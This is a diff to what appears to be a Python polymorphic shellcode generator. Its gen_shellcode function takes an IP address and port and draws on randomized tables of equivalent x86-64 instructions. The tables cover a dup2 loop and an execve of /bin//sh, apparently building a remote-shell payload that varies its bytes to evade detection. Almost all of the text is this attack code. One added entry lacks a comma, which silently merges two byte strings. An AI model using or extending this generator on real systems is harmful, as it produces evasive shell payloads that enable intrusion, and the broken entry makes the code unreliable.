@@ -46,21 +46,37 @@ def gen_shellcode(ip_adress, port) :
     xor_rax_rax = [
         "\\x48\\x31\\xC0",  # xor rax,rax
         "\\x48\\x29\\xC0",   # sub rax,rax
-        "\\x53\\x48\\x31\\xDB\\x48\\x89\\xD8\\x5B"  # push rbx; xor rbx, rbx; mov rax, rbx; pop rbx
-    
+        "\\x53\\x48\\x31\\xDB\\x48\\x89\\xD8\\x5B", # push rbx; xor rbx, rbx; mov rax, rbx; pop rbx
+        "\\x51\\x48\\x29\\xC9\\x48\\x89\\xC8\\x59", # push rcx; sub rcx, rcx; mov rax, rcx; pop rcx
+        "\\x52\\x48\\x31\\xD2\\x48\\x89\\xD0\\x5A"  # push rdx; xor rdx, rdx; mov rax, rdx; pop rdx
     ]
+
     xor_rbx_rbx = [
         "\\x48\\x31\\xDB",  # xor rbx,rbx
-        "\\x48\\x29\\xDB"   # sub rbx,rbx
+        "\\x48\\x29\\xDB",   # sub rbx,rbx
+        "\\x50\\x48\\x31\\xC0\\x48\\x89\\xC3\\x58", # push rax; xor rax, rax; mov rbx, rax; pop rax
+        "\\x51\\x48\\x29\\xC9\\x48\\x89\\xCB\\x59", # push rcx; sub rcx, rcx; mov rbx, rcx; pop rcx
+        "\\x52\\x48\\x29\\xD2\\x48\\x31\\xD2\\x48\\x89\\xD3\\x5A"   # push rdx; sub rdx, rdx; xor rdx, rdx; mov rbx, rdx; pop rdx
     ]
+
     xor_rcx_rcx = [
-        "\\x48\\x31\\xC9",  # xor rcx,rcx
-        "\\x48\\x29\\xC9"   # sub rcx,rcx
+        "\\x48\\x31\\xC9"  # xor rcx,rcx
+        "\\x48\\x29\\xC9",   # sub rcx,rcx
+        "\\x50\\x48\\x31\\xC0\\x48\\x89\\xC1\\x58",   # push rax; xor rax, rax; mov rcx, rax; pop rax
+        "\\x53\\x48\\x29\\xDB\\x48\\x89\\xD9\\x5B",   # push rbx; sub rbx, rbx; mov rcx, rbx; pop rbx
+        "\\x52\\x48\\x29\\xD2\\x48\\x31\\xD2\\x48\\x89\\xD1\\x5A"   # push rdx; sub rdx, rdx; xor rdx, rdx; mov rcx, rdx; pop rdx
+
     ]
+
     xor_rdx_rdx = [
         "\\x48\\x31\\xD2",  # xor rdx,rdx
-        "\\x48\\x29\\xD2"   # xor rdx,rdx
+        "\\x48\\x29\\xD2",   # xor rdx,rdx
+        "\\x50\\x48\\x31\\xC0\\x48\\x89\\xC2\\x58",   # push rax;xor rax, rax;mov rdx, rax;pop rax
+        "\\x53\\x48\\x29\\xDB\\x48\\x89\\xDA\\x5B",   # push rbx;sub rbx, rbx;mov rdx, rbx;pop rbx
+        "\\x51\\x48\\x29\\xC9\\x48\\x31\\xC9\\x48\\x89\\xCA\\x59"   # push rcx; sub rcx, rcx; xor rcx, rcx; mov rdx, rcx; pop rcx
+
     ]
+
     xor_rsi_rsi = [
         "\\x48\\x31\\xF6",  # xor rsi,rsi
         "\\x48\\x29\\xF6"   # sub rsi,rsi
@@ -76,12 +92,7 @@ def gen_shellcode(ip_adress, port) :
     mov_rsp_rbp = [
         "\\x48\\x89\\xe5",                      # mov rbp,rsp
         "\\x54\\x5D",                           # push rsp; pop rbp
-        "\\x48\\x89\\xE0\\x48\\x89\\xC5",       # mov rax,rsp; mov rbp,rax
-        "\\x50\\x48\\x89\\xE0\\x48\\x83\\xC0\\x01\\x48\\xFF\\xC8\\x48\\x89\\xC5\\x58",  # dec rax; mov rbp, rax; pop rax 
-        "\\x53\\x48\\x89\\xE3\\x48\\x83\\xEB\\x01\\x48\\xFF\\xC3\\x48\\x89\\xC5\\x5B",  # push rbx; mov rbx, rsp; sub rbx, 1; inc rbx; mov rbp, rax; pop rbx 
-        "\\x50\\x48\\x89\\xE0\\x48\\x6B\\xC0\\x01\\x48\\x89\\xC5\\x58"                  # push rax; mov rax, rsp; imul rax, rax, 1; mov rbp, rax; pop rax
- 
-
+        "\\x48\\x89\\xE0\\x48\\x89\\xC5"       # mov rax,rsp; mov rbp,rax
     ]
 
     push_1_pop_rsi = [
@@ -96,22 +107,15 @@ def gen_shellcode(ip_adress, port) :
     sub_rsp_8 = [
         "\\x48\\x83\\xec\\x08", # sub rsp,0x8
         "\\x48\\x83\\xEC\\x04\\x48\\x83\\xEC\\x04", # sub rsp,0x4; sub rsp,0x4
-        "\\x48\\x83\\xEC\\x03\\x48\\x83\\xEC\\x02\\x48\\x83\\xEC\\x01\\x48\\x83\\xEC\\x02", # sub rsp,0x3; sub rsp,0x2, sub rsp,0x1, sub rsp,0x2
-        "\\x48\\x83\\xEC\\x04\\x48\\x83\\xEC\\x01\\x48\\x83\\xEC\\x02\\x48\\x83\\xEC\\x01", # sub rsp,0x4; sub rsp,0x1, sub rsp,0x2, sub rsp,0x1
-        "\\x48\\x83\\xC4\\x0F\\x48\\x83\\xEC\\x12\\x48\\x83\\xEC\\x04\\x48\\x83\\xEC\\x01"  # add rsp,0xf; sub rsp,0x12; sub rsp,0x4; sub rsp,0x1
-
+        "\\x48\\x83\\xEC\\x03\\x48\\x83\\xEC\\x02\\x48\\x83\\xEC\\x01\\x48\\x83\\xEC\\x02" # sub rsp,0x3; sub rsp,0x2, sub rsp,0x1, sub rsp,0x2
     ]
-
-
     lea_rsi_rsp = [
-        "\\x48\\x8d\\x34\\x24"  # lea rsi,[rsp]
+        "\\x48\\x8d\\x34\\x24",  # lea rsi,[rsp]
+        "\\x48\\x89\\xe6" # mov rsi, rsp
     ]
     add_rsp_8 = [
         "\\x48\\x83\\xc4\\x08", # add rsp, 8
-        "\\x48\\x83\\xC4\\x04\\x48\\x83\\xC4\\x04", # add rsp, 4; add rsp, 4
-        "\\x48\\x83\\xC4\\x03\\x48\\x83\\xC4\\x02\\x48\\x83\\xC4\\x01\\x48\\x83\\xC4\\x02", # add rsp, 3; add rsp, 2; add rsp, 1; add rsp, 2
-        "\\x48\\x83\\xC4\\x04\\x48\\x83\\xC4\\x01\\x48\\x83\\xC4\\x02\\x48\\x83\\xC4\\x01", # add rsp, 4; add rsp, 1; add rsp, 2; add rsp, 1
-        "\\x48\\x83\\xC4\\x0F\\x48\\x83\\xEC\\x03\\x48\\x83\\xEC\\x01\\x48\\x83\\xEC\\x01\\x48\\x83\\xEC\\x02" # add rsp, 15; sub rsp, 3; sub rsp, 1; sub rsp, 1; sub rsp, 2
+        "\\x48\\x83\\xC4\\x04\\x48\\x83\\xC4\\x04" # add rsp, 4; add rsp, 4
     ]
 
     pop_rbx_xor_rbx_rbx = [
@@ -133,27 +137,17 @@ def gen_shellcode(ip_adress, port) :
     ]
 
     mov_al_33 = [
-        "\\xb0\\x21",   # mov al, 33
-        "\\xB0\\x1F\\x04\\x02", # mov al, 31; add al, 2
-        "\\xB0\\x1D\\x04\\x04", # mov al, 29; add al, 4
-        "\\xB0\\x14\\x04\\x0D", # mov al, 20; add al, 13
-        "\\xB0\\x28\\x2C\\x07", # mov al, 40; sub al, 7
-        "\\xB0\\x32\\x2C\\x11", # mov al, 50; sub al, 17
-        "\\xB0\\x41\\x2C\\x20"  # mov al, 65; sub al, 32  
+        "\\xb0\\x21"   # mov al, 33
     ]
     inc_rsi = [
-        "\\x48\\xff\\xc6",  # inc rsi
-        "\\x48\\x83\\xC6\\x01", # add rsi, 1
-        "\\x48\\x83\\xC6\\x02\\x48\\x83\\xEE\\x01"  # add rsi, 2; sub rsi, 1
+        "\\x48\\xff\\xc6"  # inc rsi
     ]
     cmp_rsi_2 = [
         "\\x48\\x83\\xfe\\x02"  # cmp rsi, 2
     ]
     jle_shell_loop = [
-        "\\x7e\\xf3"    # jle shell_loop
-
+        "\\x7e\\xf3"   # jle shell_loop
     ]
-    
     mov_rdi_0x68732f6e69622f2f = [
         "\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68"    # mov rdi, 0x68732f6e69622f2f
     ]
@@ -169,10 +163,7 @@ def gen_shellcode(ip_adress, port) :
     mov_al_59 =[
         "\\xb0\\x3b",           # mov al, 59
         "\\xB0\\x28\\x04\\x13", # mov al, 40; add al, 19
-        "\\xB0\\x1E\\x04\\x1D", # mov al, 30; add al, 29
-        "\\xB0\\x3A\\xFE\\xC0", # mov al, 58; inc al
-        "\\xB0\\x3D\\x2C\\x02", # mov al, 61; sub al, 2
-        "\\xB0\\x3C\\xFE\\xC8"  # mov al, 60; dec al
+        "\\xB0\\x1E\\x04\\x1D" # mov al, 30; add al, 29
     ]
 
     # code += liste1[random.randint(1,int(len(liste1))-1)]
